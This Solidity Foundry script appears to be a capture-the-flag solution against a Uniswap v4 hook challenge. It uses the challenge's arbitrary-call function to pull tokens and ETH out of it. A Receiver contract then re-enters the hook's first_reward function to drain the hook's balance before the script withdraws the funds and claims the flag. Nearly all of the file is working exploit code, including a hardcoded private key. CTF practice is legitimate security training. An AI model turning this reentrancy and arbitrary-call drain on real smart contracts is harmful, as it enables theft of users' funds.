// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolModifyLiquidityTest} from "v4-core/src/test/PoolModifyLiquidityTest.sol";
import {CurrencyLibrary, Currency} from "v4-core/src/types/Currency.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";

import {ERC20} from "../src/ERC20.sol";
import {Hook} from "../src/Hook.sol";
import {HookMiner} from "../src/HookMiner.sol";
import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
import {Challenge} from "../src/challenge.sol";

contract Solution is Test {
    using CurrencyLibrary for Currency;

    function run() external {
        // player
        vm.startBroadcast(0x4cfcd36fc80f2e0bc4f3fc0a64102797a1ce8f6c25b80c2782e27aa582ee4fd8);
        IPoolManager manager = IPoolManager(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
        Hook hook = Hook(0x7400872EE85d4546F9CB4Fa776c43B5E0c78C0C0); // Use Corresponding Hook

        Util util = new Util();
        PoolModifyLiquidityTest lpRouter = new PoolModifyLiquidityTest(manager);
        PoolSwapTest swapRouter = new PoolSwapTest(manager);
        Receiver receiver = new Receiver(hook);
        util.go{value: 91e16}(hook, lpRouter, swapRouter, receiver);
    }

    receive() external payable {}
}

contract Util {
    function go(Hook hook, PoolModifyLiquidityTest lpRouter, PoolSwapTest swapRouter, Receiver receiver)
        public
        payable
    {
        address player = msg.sender;
        Challenge challenge = Challenge(payable(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0));
        address token = 0x75537828f2ce51be7289709686A69CbFDbB714F1;

        uint256 balance = player.balance;
        console.log("player Balance: ", balance);

        balance = address(challenge).balance;
        console.log("challenge Balance: ", balance);

        // extract token
        challenge.arbitrary(
            token, abi.encodeCall(IERC20.transfer, (address(this), IERC20(token).balanceOf(address(challenge))))
        );

        // add liquidity
        PoolKey memory pool = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(token),
            fee: 0,
            tickSpacing: 10,
            hooks: IHooks(hook)
        });
        IERC20(token).approve(address(lpRouter), type(uint256).max);
        // using small amount is enough
        lpRouter.modifyLiquidity{value: 1e5}(pool, IPoolManager.ModifyLiquidityParams(-600, 600, 1e5, 0), new bytes(0));

        // set reward using challenge balance
        // use 9e17 to bypass the check `start_block`
        challenge.arbitrary{value: 9e17}(address(hook), abi.encodeCall(Hook.set_reward, ()));

        // buy token for reward
        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
            zeroForOne: true,
            amountSpecified: -11e17,
            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
        });
        PoolSwapTest.TestSettings memory testSettings =
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false});
        swapRouter.swap{value: 4e4}(pool, params, testSettings, abi.encode(address(receiver)));
        balance = player.balance;
        console.log("after swap:     ", balance);

        // swap back
        params.zeroForOne = !params.zeroForOne;
        params.amountSpecified = -params.amountSpecified;
        params.sqrtPriceLimitX96 = TickMath.MAX_SQRT_PRICE - 1;

        IERC20(token).approve(address(swapRouter), type(uint256).max);
        swapRouter.swap(pool, params, testSettings, new bytes(0));

        // withdraw funds
        payable(player).transfer(address(this).balance);
        console.log("player balance:", player.balance);

        // get flag
        challenge.isSolved();
    }

    receive() external payable {}
}

contract Receiver {
    address public owner;
    Hook hook;

    constructor(Hook _hook) {
        owner = msg.sender;
        hook = _hook;
    }

    receive() external payable {
        payable(owner).transfer(address(this).balance);

        uint256 hook_balance = address(hook).balance;
        console.log("hook balance:", hook_balance);

        // reentrancy
        if (hook_balance > 0) {
            bytes memory hookData = abi.encode(address(this));
            hook.first_reward(
                IPoolManager.SwapParams({
                    zeroForOne: true,
                    amountSpecified: -1e30, // just a big number
                    sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
                }),
                hookData
            );
        }
    }
}
